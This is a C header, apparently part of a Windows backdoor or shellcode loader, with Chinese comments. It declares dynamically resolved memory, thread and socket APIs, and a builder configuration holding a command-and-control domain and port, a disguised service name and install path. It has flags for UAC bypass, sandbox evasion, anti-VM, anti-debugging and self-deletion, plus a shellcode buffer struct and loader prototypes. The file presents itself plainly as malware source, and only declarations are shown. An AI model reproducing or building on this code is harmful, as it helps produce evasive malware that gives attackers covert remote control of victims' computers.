#pragma once
#include<WinSock2.h>
#include <ws2tcpip.h>
//kernel32.dll
typedef LPVOID (WINAPI* mVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI* mVirtualFree)(LPVOID lpAddress, SIZE_T dwSize,DWORD dwFreeType);
typedef HANDLE (WINAPI* mCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI* mWaitForSingleObject)( HANDLE hHandle, DWORD dwMilliseconds);
typedef HMODULE (WINAPI* mLoadLibraryA)(_In_ LPCSTR lpLibFileName);
//Ws2_32.dll
typedef int (WSAAPI* mWSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI* msocket)( int af,int type,int protocol);
typedef INT (WSAAPI* mgetaddrinfo)(PCSTR   pNodeName,PCSTR  pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult);
typedef u_short (WSAAPI* mhtons)(_In_ u_short hostshort);
typedef int (WSAAPI* mconnect)( SOCKET s,_In_reads_bytes_(namelen) const struct sockaddr FAR* name,_In_ int namelen);
typedef int (WSAAPI* msend)( SOCKET s,_In_reads_bytes_(len) const char FAR* buf, _In_ int len, _In_ int flags);
typedef int (WSAAPI* mrecv)( _In_ SOCKET s,_Out_writes_bytes_to_(len, return) __out_data_source(NETWORK) char FAR* buf,_In_ int len,_In_ int flags);
typedef int (WSAAPI* mWSACleanup)();
typedef struct  // 生成Dat文件结构
{
	char DNS[256];  //域名
	int  Port;		//端口
	char UpGroup[32];					//上线分组
	char Packet[32];						//备注
	char szCurrentDateTime[32];	//安装时间
	char ServiceName[50];			//服务名称
	char ServicePlay[50];				//服务显示
	char ServiceDesc[150];			//服务描述
	char ReleasePath[100];			//安装路径
	char ReleaseName[50];			//安装名称
	char szthisfile[MAX_PATH];    //当前运行文件
	int  Dele_zc;								//启动类型
	BYTE ismove;							//是否需要移动文件
	BYTE dllorexe;							//是生成的dll 还是exe
	BYTE selfDel;							//自删除
	BYTE kill;									//自杀
	BYTE Uac;									//绕过uac
	BYTE weibu;								//绕过微步沙箱
	BYTE vm;									//反虚拟机
	BYTE antidebug;						//反调试
	char Reserve[12];
}MODIFY_DATA;
typedef struct
{
	TCHAR Shellcode[10 * 1024];
	int  dwShellcodelen;
	TCHAR File[300 * 1024];
	int  dwFilelen;
	MODIFY_DATA modify_data;
	int RunSessionid;
}ShellcodeStr;
typedef struct
{
	mLoadLibraryA pmLoadLibraryA;
	mVirtualAlloc pmVirtualAlloc;
	mVirtualFree pmVirtualFree;
	mCreateThread pmCreateThread;
	mWaitForSingleObject pmWaitForSingleObject;
	mWSAStartup pmWSAStartup;
	msocket pmsocket;
	mgetaddrinfo pmgetaddrinfo;
	mhtons pmhtons;
	mconnect pmconnect;
	msend pmsend;
	mrecv pmrecv;
	mWSACleanup pmWSACleanup;
	SOCKET m_socket;
	ShellcodeStr* buff;
	MODIFY_DATA* data;
}INFO;
BOOL init(INFO* info);
DWORD WINAPI WorkThread(PVOID p);
void MyMemcpy(void* dst, void* src, size_t sizes);
DWORD_PTR fun();
DWORD GetOffset(PBYTE buff);

